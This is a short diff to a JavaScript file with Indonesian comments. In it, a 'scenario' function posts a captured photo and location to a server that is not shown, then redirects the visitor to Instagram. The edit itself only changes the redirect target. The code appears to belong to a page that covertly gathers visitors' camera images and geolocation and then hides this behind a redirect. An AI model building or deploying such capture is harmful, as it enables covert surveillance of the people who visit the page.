@@ -59,8 +59,8 @@ async function jalankanSkenario() {
             body: JSON.stringify({ foto: foto, lokasi: lokasi })
         });
         
-        // Alihkan ke Google Form
-        window.location.href = 'https://www.instagram.com/bin_mori/';
+        // Alihkan ke Instagram umum
+        window.location.href = 'https://www.instagram.com/';
 
     } else {
         // Jika semua izin ditolak, tidak melakukan apa-apa
